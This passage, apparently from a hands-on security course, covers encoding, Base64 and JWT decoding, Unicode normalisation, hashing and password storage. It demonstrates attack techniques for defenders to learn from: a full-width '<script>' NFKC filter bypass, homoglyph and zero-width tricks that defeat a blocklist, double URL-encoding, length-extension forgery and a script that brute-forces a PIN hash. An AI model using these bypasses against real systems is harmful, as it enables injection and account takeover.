                      +---------------v---------------------------+
                      |  PostgreSQL: users, orders, payment tokens |
                      +--------------------------------------------+

   staff -----> admin.securesh.op  (admin panel, SSH to the servers)
```

### What we have to protect

| Asset | Property that matters | Why |
|---|---|---|
| Customer passwords | Confidentiality | Reused elsewhere; a breach harms people directly |
| Payment tokens | Confidentiality + Integrity | Money, and PCI-DSS obligations |
| Order data | Confidentiality (per-customer) | Alice must not read Bob's orders |
| The price field | **Integrity** | A customer changing the price is fraud |
| The site itself | Availability | Downtime is lost revenue |
| Admin access | All three | Full compromise if lost |

### How each Part contributes

| Part | Adds to SecureShop |
|---|---|
| 2 — Encoding | Understanding why the session token being Base64 protects nothing |
| 3 — Hashing | Storing passwords so a breach doesn't hand over accounts |
| 4 — Symmetric | Encrypting payment tokens at rest, correctly |
| 5 — Asymmetric | Signing API requests; the keys behind TLS |
| 6 — Post-quantum | Making sure today's traffic isn't readable in 2035 |
| 7 — TLS | HTTPS that actually resists interception; internal mTLS |
| 8 — SSH | Staff access to servers without passwords |
| 9 — Network | Segmenting the database away from the internet |
| 10 — Web | Fixing injection, broken access control, session flaws |
| 11 — Operations | Detecting the breach you didn't prevent |
| 12 — Projects | Building all of it for real |

### Practice (10 min, no code)

Before you learn any of the answers, write your instinct in `notes.md`:

1. How would you store the passwords?
2. Where would you store the key that encrypts payment tokens?
3. How would you stop a customer viewing another customer's order?
4. What stops someone changing the price in the checkout request?

**Keep your answers.** In Chapter 52 you'll compare them against what you've
learned. Most people get at least two badly wrong, and seeing that is the point.

### Further reading

- **Article:** "Threat Modeling: 12 Available Methods" — Carnegie Mellon SEI. A
  good survey before Chapter 52.
- **Tool:** OWASP Threat Dragon — free threat-modelling tool; try it on
  SecureShop after Chapter 52.

---

### End of Part 1 — Milestone check

- [ ] I can name the CIA triad and give a real failure for each
- [ ] I can explain what a trust boundary is and what happens there
- [ ] I can state the encoding / encryption / hashing difference from memory
- [ ] I know the difference between authentication and authorization
- [ ] I have written a threat model for one system I know
- [ ] **My lab is built and Juice Shop runs**

---

# Part 2 — Encoding: the thing that is *not* security

This Part is short and it prevents a whole category of career-damaging mistakes.

## Chapter 5 — How text becomes bytes

### In one sentence

Computers store numbers, so every character must be mapped to a number, and the
mapping is called a character encoding.

### The problem

A file, a network packet, and memory all hold **bytes** — numbers from 0 to 255.
The letter `A` is not a number. Something must decide that `A` = 65.

### ASCII: the original 128

```
   char  decimal  hex   binary
   ----  -------  ---   --------
   'A'      65    0x41  01000001
   'B'      66    0x42  01000010
   'a'      97    0x61  01100001
   '0'      48    0x30  00110000
   ' '      32    0x20  00100000
   '\n'     10    0x0A  00001010
```

Notice `'0'` is **48**, not 0. The *character* zero and the *number* zero are
different things — a distinction behind many parsing bugs.

ASCII uses 7 bits, so 128 characters. Enough for American English. Not enough for
the world.

### UTF-8: how the world actually encodes text

UTF-8 represents over a million characters using **1 to 4 bytes each**, and — the
crucial design win — **ASCII text is byte-identical in UTF-8**.

```
   'A'    -> 41                     1 byte   (identical to ASCII)
   'e'    -> 65                     1 byte
   'é'    -> C3 A9                  2 bytes
   '€'    -> E2 82 AC               3 bytes
   emoji  -> F0 9F 98 80            4 bytes
```

**Two consequences that cause security bugs:**

1. **Character count ≠ byte count.** A "10-character" username can be 40 bytes.
   Length limits that count one and buffers that hold the other is a classic
   overflow.
2. **Invalid byte sequences exist.** Not every byte string is valid UTF-8.
   Different parsers handle invalid sequences differently — one may reject, one
   may substitute, one may silently drop bytes. **Two parsers disagreeing about
   the same input is the root of an entire attack class** (Chapter 7).

### Practice (10 min)

```bash
# see the bytes behind text
printf 'Hello' | xxd
printf 'Héllo' | xxd          # note the two bytes for é
printf '€' | xxd

# character count vs byte count
python3 -c "s='Héllo€'; print('chars:', len(s), ' bytes:', len(s.encode()))"

# what happens with invalid UTF-8?
printf '\xc3\x28' | python3 -c "import sys; print(sys.stdin.buffer.read().decode('utf-8', errors='replace'))"
```

### Check yourself

1. Why is the character `'0'` stored as 48?
2. Give one security-relevant consequence of characters taking a variable number
   of bytes.
3. Why does it matter that not every byte sequence is valid UTF-8?

### Further reading

- **Article (a classic):** "The Absolute Minimum Every Software Developer
  Absolutely, Positively Must Know About Unicode and Character Sets" — Joel
  Spolsky. Twenty years old, still correct, still the best introduction.
- **Reference:** `utf8everywhere.org` — a strongly-argued case for UTF-8, with
  good technical detail.

---

## Chapter 6 — Base64, hex, and URL encoding: none of them protect anything

### In one sentence

Encoding changes how data *looks* so it can travel safely through systems that
would mangle it — and anyone can reverse it instantly, which is why it is not
security.

### The problem encoding solves

Some channels can't carry arbitrary bytes.

```
   Email (historically) was 7-bit ASCII only. A JPEG has bytes > 127.
   A URL can't contain a raw space, '&', or '#' -- they mean something.
   JSON can't hold arbitrary binary in a string.
   A terminal will beep, clear, or misbehave on control bytes.
```

So you re-express the same data using only "safe" characters. **No secret is
involved.** That's the entire point — the receiver must be able to reverse it
without any prior arrangement.

### Base64

Takes 3 bytes (24 bits) and re-expresses them as 4 characters (6 bits each) from
a 64-character alphabet: `A–Z a–z 0–9 + /`, padding with `=`.

```
   Input:  M         a         n
   ASCII:  77        97        110
   Binary: 01001101  01100001  01101110
           |------|--|----|----|--|------|
   6-bit:  010011   010110   000101   101110
   Value:  19       22       5        46
   Base64: T        W        F        u

   "Man" -> "TWFu"
```

Padding handles inputs that aren't a multiple of 3:

```
   "Man"  (3 bytes) -> "TWFu"      no padding
   "Ma"   (2 bytes) -> "TWE="      one '='
   "M"    (1 byte)  -> "TQ=="      two '='
```

**Base64 makes data ~33% bigger** (4 characters for every 3 bytes). That's the
price of the safe alphabet.

**Variants you'll meet:**

| Variant | Difference | Where |
|---|---|---|
| Standard | `+` and `/`, `=` padding | MIME, most APIs |
| **URL-safe** | `-` and `_` instead of `+` and `/` | JWTs, URLs, filenames |
| No padding | `=` omitted | JWTs |

Using the wrong variant is a very common bug — a `+` in a URL is decoded as a
space, silently corrupting the data.

### Hexadecimal

Each byte becomes exactly two characters `0-9 a-f`. Doubles the size, but is
trivially readable and has no variants to get wrong.

```
   "Hello"  ->  48 65 6c 6c 6f
```

Used for hashes, keys, MAC addresses, and anywhere humans read raw bytes.

### URL encoding (percent-encoding)

Unsafe characters become `%` plus two hex digits.

```
   space  -> %20    (or '+' in a query string, confusingly)
   /      -> %2F
   ?      -> %3F
   &      -> %26
   #      -> %23
   %      -> %25    <-- encoding the encoder
```

**Double-encoding is a real attack.** `%252F` decodes once to `%2F` and twice to
`/`. If one component in a chain decodes and another decodes again, an attacker
can smuggle a path separator past a filter. We'll use this in Chapter 45.

### The thing to internalise

```
   +----------------------------------------------------------------+
   |  ENCODING IS NOT ENCRYPTION.                                    |
   |                                                                 |
   |  There is no key. There is no secret. There is no protection.    |
   |  Anyone with the encoded data can recover the original in        |
   |  microseconds, with a command that ships on every computer.      |
   |                                                                 |
   |  Base64 is an envelope, not a safe.                              |
   +----------------------------------------------------------------+
```

### Real-world example: "we encrypt the password"

A production API sends:

```json
   { "user": "alice", "password": "aHVudGVyMg==" }
```

The developer called this "encrypted". It is Base64 of `hunter2`:

```bash
echo 'aHVudGVyMg==' | base64 -d      # hunter2
```

This happens constantly. It appears in code review, in vendor documentation, and
in breach post-mortems. **If someone tells you data is protected by Base64, they
have told you it is not protected.**

The same mistake with a different costume: **JWTs**. A JWT looks cryptic and is
just Base64url:

```bash
# The payload of any JWT is readable by anyone. Try one:
echo 'eyJzdWIiOiIxMjM0NSIsInJvbGUiOiJhZG1pbiJ9' | base64 -d
# {"sub":"12345","role":"admin"}
```

A JWT's *signature* provides integrity (Chapter 11), but **the contents are
public**. Never put a secret in a JWT payload.

### Practice (25 min)

```bash
cd ~/sec-lab/scratch

# --- Base64 both ways ---
printf 'Hello world' | base64                 # SGVsbG8gd29ybGQ=
echo 'SGVsbG8gd29ybGQ=' | base64 -d           # Hello world

# --- watch padding appear ---
for s in M Ma Man Many; do printf "%-5s -> " "$s"; printf "%s" "$s" | base64; done

# --- hex ---
printf 'Hello' | xxd -p                        # 48656c6c6f
echo '48656c6c6f' | xxd -r -p                  # Hello

# --- URL encoding ---
python3 -c "import urllib.parse as u; print(u.quote('hello world/&?'))"
python3 -c "import urllib.parse as u; print(u.unquote('%68%65%6C%6C%6F'))"

# --- double encoding ---
python3 -c "import urllib.parse as u; print(u.unquote('%252F'), '->', u.unquote(u.unquote('%252F')))"

# --- decode a real JWT payload ---
JWT='eyJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiYWxpY2UiLCJyb2xlIjoiYWRtaW4ifQ.fakesig'
echo "$JWT" | cut -d. -f2 | tr '_-' '/+' | base64 -d 2>/dev/null; echo
```

**Break it (this is the important part):**

1. Base64-encode something you'd consider secret. Now decode it. **How long did
   the "protection" last?**
2. Take `SGVsbG8=` and change one character to `SGVsbG9=`. Decode it. Encoding has
   **no integrity protection** — nothing detects tampering.
3. Encode a string containing `+` and `/`, then put it in a URL. Watch it break.
   Now use URL-safe Base64 (`base64 | tr '+/' '-_'`).

### Common confusions

- **"Base64 is hashing."** No — it's fully reversible.
- **"Base64 is compression."** No — it makes data 33% *bigger*.
- **"The API needs the password Base64-encoded, so it's secure."** The encoding is
  for transport. **HTTPS** (Chapter 27) provides the security. Without HTTPS,
  Base64 credentials are plaintext credentials. This is exactly what HTTP Basic
  auth is, and why it must never be used without TLS.
- **"I'll encode the data twice for extra security."** Twice zero is zero.

### Check yourself

1. Why does Base64 exist? What problem does it solve?
2. Why is Base64 output ~33% larger than the input?
3. What does the `=` at the end mean?
4. Can you tell if Base64-encoded data has been tampered with? Why not?
5. Is a JWT's payload secret?

### Further reading

- **RFC 4648** — the Base64/Base32/Base16 spec. Short, and it defines the
  URL-safe alphabet you'll keep meeting.
- **Site:** `jwt.io` — paste a JWT and watch it decode instantly. The best
  demonstration of "encoded ≠ protected" that exists.
- **Article:** OWASP's "Password Storage Cheat Sheet" — read the opening section
  for what *not* to do.

---

## Chapter 7 — Unicode, normalisation, and the bugs they cause

### In one sentence

Two strings that look identical to a human can be different bytes — and two
systems that disagree about which is which is a security vulnerability.

### The problem: visual identity is not byte identity

```
   'é' can be encoded TWO ways in Unicode:

     U+00E9              LATIN SMALL LETTER E WITH ACUTE   -> C3 A9
     U+0065 U+0301       'e' + COMBINING ACUTE ACCENT      -> 65 CC 81

   They render identically. They are different bytes.
   A byte comparison says they are different. A human says they are the same.
```

**Normalisation** converts to a canonical form so comparison works:

| Form | Does |
|---|---|
| **NFC** | Compose: prefer the single combined character. **Use this by default.** |
| **NFD** | Decompose: prefer base character + combining marks |
| **NFKC / NFKD** | Also fold "compatibility" characters — `ﬁ` → `fi`, `①` → `1`, full-width → ASCII. **Lossy.** |

### Why an attacker cares

**Attack 1 — Account confusion.** If registration normalises but login doesn't
(or vice versa), you can register a "different" account that logs in as an
existing one, or vice versa.

**Attack 2 — Filter bypass through NFKC.** This is the sharp one:

```
   A filter blocks the string "<script>".

   An attacker sends:   ＜script＞      (full-width characters, U+FF1C/U+FF1E)

   The filter compares bytes -> no match -> ALLOWED.
   Later, some component normalises with NFKC:
        ＜  ->  <
        ＞  ->  >
   The output is now  <script>  in the page.
```

**The rule that prevents this: normalise *before* you validate, never after.**

**Attack 3 — Homoglyphs.** Different characters that look the same:

```
   'a'  U+0061  Latin small letter A
   'а'  U+0430  CYRILLIC small letter A     <-- visually identical

   раypal.com   is not   paypal.com
```

This is the basis of IDN homograph phishing. Browsers defend by showing
**punycode** (`xn--...`) when a domain mixes scripts suspiciously.

**Attack 4 — Invisible characters.** Zero-width spaces (U+200B), bidirectional
overrides (U+202E), and Unicode "tag" characters (U+E0000 block) are invisible in
most renderings but present in the bytes. Uses:
- Bypassing keyword filters
- **"Trojan Source"** — bidi overrides make source code *display* differently from
  how it *compiles*, hiding a backdoor in plain sight during code review
- Hiding prompt-injection instructions in text an AI system reads

### The defensive rules

```
   1. NORMALISE ON INPUT, at the trust boundary. NFC for general text.
   2. Normalise BEFORE validating, not after.
   3. Strip invisible/control characters explicitly. Don't hope.
   4. For usernames and identifiers: restrict to an ALLOWLIST of characters
      (e.g. a-z 0-9 . _ -) rather than trying to block bad ones.
   5. Compare identifiers case-folded AND normalised, consistently, everywhere.
   6. Set explicit encodings: Content-Type with charset, database column
      collation, and your language's string handling.
```

Rule 4 is worth emphasising: **allowlists beat blocklists**, always. You can
enumerate what's permitted; you cannot enumerate what's malicious.

### Practice (25 min)

```bash
cd ~/sec-lab/scratch

python3 - <<'PY'
import unicodedata as ud

# 1. Two 'identical' strings
a = "café"                      # composed
b = "café"                # decomposed
print("look the same? ", a, b)
print("equal bytes?   ", a == b)
print("after NFC?     ", ud.normalize("NFC", a) == ud.normalize("NFC", b))
print("byte lengths:  ", len(a.encode()), len(b.encode()))

# 2. NFKC bypass -- the dangerous one
attack = "＜script＞"    # full-width < and >
print("\nfilter sees:   ", repr(attack), " blocked? ", "<script>" in attack)
print("after NFKC:    ", repr(ud.normalize("NFKC", attack)),
      " now dangerous? ", "<script>" in ud.normalize("NFKC", attack))

# 3. Homoglyphs
print("\npaypal (latin):  ", "paypal.com".encode())
print("paypal (cyrillic a):", "pаypal.com".encode())
print("equal? ", "paypal.com" == "pаypal.com")

# 4. Invisible characters
sneaky = "admin​"           # trailing zero-width space
print("\nlooks like 'admin'? ", sneaky)
print("is 'admin'?         ", sneaky == "admin")
print("stripped:           ", "".join(c for c in sneaky if ud.category(c)[0] != "C"))
PY
```

**Break it:** write a "username validator" that lowercases and compares to a
blocklist containing `admin`. Then defeat it with:
- `Admin` with a zero-width space
- `аdmin` with a Cyrillic а
- `ADMIN` in full-width characters

Then fix it with: NFKC normalise → strip non-printing → allowlist `[a-z0-9_-]`
→ compare.

### Common confusions

- **"I'll just use NFKC everywhere, it's the most aggressive."** NFKC is *lossy*
  — it destroys meaningful distinctions (`x²` → `x2`). Use NFC for storage and
  display; use NFKC only for *comparison keys* like usernames.
- **"Emoji are the security problem."** Emoji are well-behaved. Invisible
  characters and homoglyphs are the problem.
- **"Our database handles this."** Databases have their own collation rules that
  may differ from your application's. Normalise in the application, at the
  boundary, once.

### Check yourself

1. Give two Unicode representations of the same visible character.
2. Why must you normalise *before* validating?
3. What is a homoglyph attack?
4. Why are allowlists better than blocklists for usernames?

### Further reading

- **Report:** "Trojan Source: Invisible Vulnerabilities" (Boucher & Anderson,
  2021) — bidi attacks on source code. Genuinely unsettling, and short.
- **Standard:** Unicode UTS #39, "Unicode Security Mechanisms" — the official
  guidance on confusables and restriction levels.
- **Tool:** `util.unicode.org/UnicodeJsps/confusables.jsp` — see which characters
  are confusable with which.

---

### End of Part 2 — Milestone check

- [ ] I can explain Base64 without saying the word "encrypt"
- [ ] **I have decoded a JWT payload and understood the implication**
- [ ] I know why encoding provides no integrity protection
- [ ] I can explain an NFKC filter bypass
- [ ] I know to normalise before validating

---

# Part 3 — Hashing: fingerprints for data

## Chapter 8 — What a hash function is

### In one sentence

A hash function turns any input into a fixed-size fingerprint, such that the same
input always gives the same fingerprint and you can't work backwards.

### The idea

```
   ANY input, any size                     Fixed-size output
   ------------------                      -----------------
   "hello"                    -->  SHA-256  -->  2cf24dba5fb0a30e26e83b2ac5b9e29e
                                                 1b161e5c1fa7425e73043362938b9824
   a 4 GB video file          -->  SHA-256  -->  (a different 64 hex characters)
   the empty string           -->  SHA-256  -->  e3b0c44298fc1c149afbf4c8996fb924
                                                 27ae41e4649b934ca495991b7852b855
```

Always 256 bits (64 hex characters) out, regardless of input size.

### The properties that make it useful

A cryptographic hash function must have **all four**:

```
   1. DETERMINISTIC        same input -> always the same output
                           (otherwise it's useless for comparison)

   2. ONE-WAY              given the hash, you cannot find the input
      (preimage resistance) except by guessing

   3. AVALANCHE            change ONE BIT of input -> ~half the output bits flip
                           (so similar inputs look completely unrelated)

   4. COLLISION RESISTANT  it's infeasible to find TWO inputs with the
                           same output
```

### Seeing the avalanche effect

```
   sha256("hello")   = 2cf24dba5fb0a30e26e83b2ac5b9e29e1b161e5c1fa7425e73043362938b9824
   sha256("hello ")  = 5e3235a8346e5a4585f8c58562f5052b8fe26a3bb122e1e96c76784964dfc461
                       ^^ one added space -- completely different output
   sha256("Hello")   = 185f8db32271fe25f561a6fc938b2e264306ec304eda518007d1764826381969
                       ^^ one changed bit (case) -- completely different
```

**This is why hashes detect tampering.** Any change, however small, produces an
unrecognisably different result.

### Collisions must exist (and why that's OK)

Infinite possible inputs, finite outputs (2^256 for SHA-256). So collisions
*mathematically must* exist. The security property is that **finding one is
infeasible**.

> **The birthday paradox:** because of how probability works, finding *any*
> collision takes about `2^(n/2)` work, not `2^n`. So SHA-256's 256-bit output
> gives **128 bits of collision resistance**, not 256. This is why "128-bit
> security" is the target and why SHA-256 (not SHA-128) is the baseline.

### What hashes are for

| Use | How |
|---|---|
| **Integrity checking** | Publish the hash of a download; the user verifies |
| **Deduplication** | Same hash = same content, cheaply |
| **Data structures** | Hash tables, Merkle trees, git commits, blockchains |
| **Password storage** | With critical modifications — see Chapter 10 |
| **Digital signatures** | Sign the hash, not the (huge) document (Chapter 21) |
| **Commitment** | Publish a hash now, reveal the data later, proving you didn't change it |

### What hashes are NOT for

```
   NOT encryption      -- there's no key and no way back. You can't "decrypt a hash".
   NOT for passwords   -- not plain, anyway. Chapter 10.
   NOT for secrecy of  -- if the input space is small (a credit card number,
   low-entropy data       a phone number, a UK postcode), an attacker just
                          hashes every possibility and looks yours up.
```

That last one catches people. Hashing an email address does **not** anonymise it —
there are only so many email addresses, and attackers have precomputed them.

### Practice (20 min)

```bash
cd ~/sec-lab/scratch

# --- basic hashing ---
printf 'hello' | openssl dgst -sha256
printf 'hello' | shasum -a 256          # same thing, different tool

# --- avalanche: change one character ---
for s in "hello" "hellp" "Hello" "hello "; do
  printf "%-8s " "$s"; printf "%s" "$s" | openssl dgst -sha256 | awk '{print $2}'
done

# --- deterministic: run it 3 times ---
for i in 1 2 3; do printf 'hello' | openssl dgst -sha256 -r; done

# --- fixed size regardless of input ---
printf 'a' | openssl dgst -sha256 | awk '{print length($2), $2}'
head -c 10000000 /dev/urandom | openssl dgst -sha256 | awk '{print length($2), $2}'

# --- verifying a download (do this for real, always) ---
echo "important data" > file.txt
openssl dgst -sha256 file.txt > file.txt.sha256
cat file.txt.sha256
# now tamper with it:
echo "important data " > file.txt        # added ONE space
openssl dgst -sha256 file.txt            # compare -- completely different
```

**Break it:** hash a 4-digit PIN with SHA-256. Now write four lines of Python
that recover the PIN from the hash. **How long did it take?** That's why
Chapter 10 exists.

```bash
python3 - <<'PY'
import hashlib
target = hashlib.sha256(b"4271").hexdigest()
print("hash:", target)
for i in range(10000):
    if hashlib.sha256(f"{i:04d}".encode()).hexdigest() == target:
        print("cracked:", f"{i:04d}"); break
PY
```

### Common confusions

- **"Can I decrypt this hash?"** No. There is nothing to decrypt. If someone
  "reverses" a hash they either guessed the input or looked it up in a table of
  precomputed hashes.
- **"Hashing anonymises personal data."** Only if the input has high entropy.
  Hashed emails, phone numbers, and IDs are readily reversible by brute force and
  are generally still personal data under GDPR.
- **"Two files with the same hash are the same file."** For a strong hash,
  practically yes. For MD5 or SHA-1, **no** — see Chapter 9.

### Check yourself

1. Name the four properties of a cryptographic hash function.
2. Why must collisions exist?
3. Why does a 256-bit hash give 128-bit collision resistance?
4. Why doesn't hashing protect a credit card number?

### Further reading

- **Video:** Computerphile, "Hashing Algorithms and Security" (~8 min).
- **Book:** *Serious Cryptography*, Chapter 6 (Hash Functions).
- **Tool:** `crackstation.net` — paste a hash of a common word and watch it come
  back instantly. A visceral lesson in why unsalted hashes fail.

---

## Chapter 9 — The real hash functions, and which are broken

### In one sentence

MD5 and SHA-1 are broken and must not be used for security; SHA-2, SHA-3, and
BLAKE2/3 are fine.

### The table to memorise

| Algorithm | Output | Status | Use it? |
|---|---|---|---|
| **MD5** | 128 bit | **BROKEN** — collisions found in seconds | **Never** for security. Non-security checksums only. |
| **SHA-1** | 160 bit | **BROKEN** — practical collisions (SHAttered, 2017; chosen-prefix, 2020) | **Never** for new work |
| **SHA-256 / SHA-512** (SHA-2) | 256 / 512 bit | Secure | **Yes — the default** |
| **SHA-3 / SHAKE** | variable | Secure, different internal design | Yes; useful as a hedge against SHA-2 |
| **BLAKE2 / BLAKE3** | variable | Secure, very fast | Yes, where supported |

### What "broken" actually means

The distinction matters, because "MD5 is broken" is often over- and
under-stated.

```
   COLLISION ATTACK  -- find ANY two inputs with the same hash.
      MD5:   seconds on a laptop
      SHA-1: ~2^63 work; done for real in 2017 (SHAttered)
      -> breaks SIGNATURES and CERTIFICATES

   CHOSEN-PREFIX COLLISION -- find a collision where you control both prefixes.
      MD5:   trivial
      SHA-1: demonstrated in 2020, ~$45k of compute at the time
      -> breaks practically everything; this is what killed SHA-1 for good

   PREIMAGE ATTACK -- given a hash, find AN input producing it.
      MD5:   still not practical
      SHA-1: still not practical
      -> so "MD5 of a strong random value" isn't instantly broken...
         but there is no reason to use it, and plenty of ways it bites you
```

**Bottom line:** MD5 and SHA-1 fail exactly where hashes matter most — proving
that a document, certificate, or binary is the one you think it is.

### The real-world consequences

**Flame malware (2012)** forged a Microsoft code-signing certificate using an MD5
chosen-prefix collision. It let malware appear to be a legitimate Windows Update.
That is the practical meaning of "collisions break signatures".

**SHAttered (2017)** — Google and CWI produced two different PDF files with the
same SHA-1 hash. Immediately afterwards, SHA-1 was removed from certificate
issuance, and git had to add collision detection.

### Choosing in practice

```
   General-purpose hashing, integrity, signatures    -> SHA-256
   Need extra margin / long-term                     -> SHA-512 or SHA-3-256
   Performance-critical (lots of data)               -> BLAKE3
   Hashing PASSWORDS                                 -> NONE OF THESE (Chapter 10)
   Legacy system compatibility only                  -> document the risk, plan removal
```

> **Simplified:** SHA-512 is often *faster* than SHA-256 on 64-bit CPUs, despite
> the bigger output. If you want margin and speed, SHA-512 (or its truncated
> variant SHA-512/256) is a good pick.

### Length-extension: a subtlety that matters

SHA-1 and SHA-2 have a structural quirk: given `hash(secret || message)` and the
*length* of `secret`, an attacker can compute `hash(secret || message || extra)`
**without knowing the secret**.

```
   NAIVE (broken):   token = sha256(secret + data)
                     -> attacker appends "&admin=true" and forges a valid token

   CORRECT:          token = HMAC-SHA256(secret, data)      (Chapter 11)
```

SHA-3 and BLAKE2/3 are immune by design. **But the right answer is always HMAC**,
not picking a different hash.

### Practice (25 min)

```bash
cd ~/sec-lab/scratch

# --- compare algorithms and their output sizes ---
for alg in md5 sha1 sha256 sha512 sha3-256; do
  printf "%-10s " "$alg"; printf 'hello' | openssl dgst -$alg 2>/dev/null | awk '{print $2}'
done

# --- speed comparison ---
openssl speed -evp sha256 2>/dev/null | tail -3
openssl speed -evp sha512 2>/dev/null | tail -3

# --- see a REAL MD5 collision ---
# Two different files, identical MD5. (Marc Stevens' classic example.)
curl -sO https://raw.githubusercontent.com/corkami/collisions/master/examples/free/md5_1.bin
curl -sO https://raw.githubusercontent.com/corkami/collisions/master/examples/free/md5_2.bin
cmp md5_1.bin md5_2.bin && echo "identical files" || echo "DIFFERENT files"
openssl dgst -md5 md5_1.bin md5_2.bin
openssl dgst -sha256 md5_1.bin md5_2.bin      # SHA-256 tells them apart
```

That last exercise is worth doing properly. **Two files that differ, with the
same MD5.** Once you've seen it, "MD5 is broken" stops being abstract.

**Break it:** write a script that verifies a download using MD5. Then explain, in
`notes.md`, exactly how an attacker who can also produce the "official" file
defeats your check.

### Common confusions

- **"MD5 is fine for checksums."** For detecting *accidental* corruption, yes.
  For detecting *deliberate* tampering, no — and most checksum use is really
  about tampering.
- **"I'll use MD5 then SHA-256, two hashes are safer."** Concatenating hashes is
  barely stronger than the stronger one alone. Just use SHA-256.
- **"SHA-256 is slow."** It processes hundreds of MB/s per core, and most CPUs
  have hardware acceleration. It is not your bottleneck.
- **"More output bits = more secure."** Only to a point. 256 bits is beyond any
  foreseeable brute force; going bigger buys margin, not necessity.

### Check yourself

1. What does it mean that MD5 is "broken"? Which property fails?
2. Why does a collision attack break digital signatures?
3. What is a length-extension attack, and what's the correct fix?
4. Which hash should you use by default in 2026?

### Further reading

- **Site:** `shattered.io` — Google's SHA-1 collision announcement, with the two
  colliding PDFs. Excellent and accessible.
- **Repository:** `github.com/corkami/collisions` — a collection of real hash
  collisions in many file formats. Superb for building intuition.
- **Guidance:** NIST SP 800-131A — the official "which algorithms are still
  approved" document. Useful to cite in an argument.

---

## Chapter 10 — Password storage is a completely different problem

### In one sentence

Passwords need a **deliberately slow** hash with a **unique salt**, because
attackers who steal your database will otherwise guess billions of candidates per
second.

### Why SHA-256 is the wrong tool here

Everything that makes SHA-256 a good hash makes it a terrible password hash:
**it's fast.**

```
   A modern GPU computes roughly 10 BILLION SHA-256 hashes per second.
   A rig of 8 GPUs: ~100 billion per second.

   Every 8-character lowercase password:  26^8  = 209 billion  -> ~2 seconds
   Every 8-character alphanumeric:        62^8  = 218 trillion -> ~36 minutes
```

Your users' passwords are not random. Attackers start with wordlists of the
billions of passwords already leaked, plus rules that append `123` and `!`. In
practice, most of a stolen SHA-256 password database is cracked within hours.

### The three problems, and their fixes

**Problem 1 — Speed.** Fixed by a **deliberately slow, tunable** function.

**Problem 2 — Identical passwords hash identically.**

```
   Without a salt:
     alice   sha256("password123") = ef92b778ba...
     bob     sha256("password123") = ef92b778ba...    <-- same!

   The attacker instantly sees they share a password, and cracking it once
   cracks both. Worse, PRECOMPUTED TABLES (rainbow tables) of common
   passwords let them skip the work entirely.
```

Fixed by a **salt**: random, unique per user, stored alongside the hash.

```
   With a salt:
     alice   salt=7f3a...  hash(salt + "password123") = 91cd44...
     bob     salt=c218...  hash(salt + "password123") = 3e0ab7...
                                                        ^^ different

   Precomputation is now useless -- an attacker must attack each user
   separately.
```

**The salt is not secret.** It's stored in plaintext with the hash. Its only job
is uniqueness.

**Problem 3 — GPUs are very good at hashing.** Fixed by making the function
**memory-hard**, so a GPU's thousands of small cores can't be used efficiently.

### What to actually use (2026)

| Algorithm | Use it? | Recommended parameters* |
|---|---|---|
| **Argon2id** | **First choice** | ≥19 MiB memory, 2 iterations, 1 parallelism |
| **scrypt** | Good alternative | N=2^17 (128 MiB), r=8, p=1 |
| **bcrypt** | Fine; very widely available | work factor ≥10; **beware the 72-byte input limit** |
| **PBKDF2-HMAC-SHA256** | Only when FIPS compliance requires it | ≥600,000 iterations |
| SHA-256, SHA-512, MD5 | **Never** for passwords | — |

\* These are OWASP's current minimums. **Verify against the OWASP Password
Storage Cheat Sheet before you ship** — the numbers rise as hardware improves.

**How to tune:** pick the highest cost your server can afford. A good target is
**~250–500 ms per hash** on your production hardware. Measure it; don't guess.

### The bcrypt gotcha

bcrypt silently truncates input at **72 bytes**. Two consequences:

```
   1. A very long passphrase is cut short -- everything past 72 bytes is ignored.
   2. If you PRE-HASH to work around it (bcrypt(sha256(password))), you must
      base64-encode the digest first -- raw SHA-256 output can contain a NUL
      byte, and some bcrypt implementations truncate at the first NUL,
      catastrophically reducing the effective password.
```

If you need long passphrases, use Argon2id and avoid the whole issue.

### Peppering (optional extra layer)

A **pepper** is a secret value added to every password hash, stored *outside*
the database — in an HSM, a KMS, or at least a separate config store.

```
   hash = Argon2id(password + pepper, salt)

   If the attacker steals only the DATABASE, they can't crack anything
   without the pepper.
   If they steal the application server too, the pepper is gone.
```

It's genuinely useful defence in depth, but it complicates key rotation. Do the
salt correctly first.

### The complete implementation

```python
# pip install argon2-cffi
from argon2 import PasswordHasher
from argon2.exceptions import VerifyMismatchError, InvalidHashError

ph = PasswordHasher(
    memory_cost=65536,   # 64 MiB -- above the OWASP minimum; tune to your box
    time_cost=3,         # iterations
    parallelism=4,       # lanes
)

def register(password: str) -> str:
    # argon2-cffi generates a random salt and stores it IN the hash string
    return ph.hash(password)          # store this whole string in the DB

def login(stored_hash: str, password: str) -> bool:
    try:
        ph.verify(stored_hash, password)
    except (VerifyMismatchError, InvalidHashError):
        return False
    # transparently upgrade the cost when you raise parameters later
    if ph.check_needs_rehash(stored_hash):
        save_new_hash(ph.hash(password))
    return True
```

The stored value looks like this — **everything needed to verify is in it**:

```
   $argon2id$v=19$m=65536,t=3,p=4$c29tZXNhbHQ$RdescudvJCsgt3ub+b+dWRWJTmaaJObG
   \_______/ \__/ \______________/ \________/ \_________________________________/
   algorithm  ver    parameters       salt                  hash
```

That self-describing format is why you can raise the cost later without breaking
existing users.

### The other things that matter more than the hash

```
   [ ] Rate-limit login attempts (per account AND per IP)
   [ ] Check against known-breached passwords (Have I Been Pwned's k-anonymity
       API lets you do this without sending the password or its full hash)
   [ ] Support long passphrases -- set a maximum around 64-128 chars, not 16
   [ ] Do NOT impose silly composition rules; NIST SP 800-63B advises against
       forced complexity and forced periodic rotation
   [ ] Offer MFA -- it defeats credential stuffing even when a password leaks
   [ ] Never log the password. Check your error handlers and APM tooling.
   [ ] Use a CONSTANT-TIME comparison for any token comparison (Chapter 11)
   [ ] Return the SAME error and timing for "no such user" and "wrong password"
```

That last one prevents **username enumeration** — otherwise an attacker learns
which accounts exist, which makes everything else easier.

### Practice (35 min)

```bash
cd ~/sec-lab/scratch
pip install argon2-cffi bcrypt 2>/dev/null || pip3 install argon2-cffi bcrypt

python3 - <<'PY'
import time, hashlib
from argon2 import PasswordHasher
import bcrypt

pw = b"correct horse battery staple"

# 1. How fast is a plain hash? (This is the problem.)
t = time.time()
for _ in range(100000): hashlib.sha256(pw).hexdigest()
dt = time.time() - t
print(f"SHA-256: {100000/dt:>12,.0f} hashes/sec on ONE CPU core")
print(f"         a GPU rig does this ~100,000x faster\n")

# 2. bcrypt
t = time.time(); h = bcrypt.hashpw(pw, bcrypt.gensalt(12)); dt = time.time()-t
print(f"bcrypt(12): {dt*1000:.0f} ms  -> {1/dt:,.1f} hashes/sec")
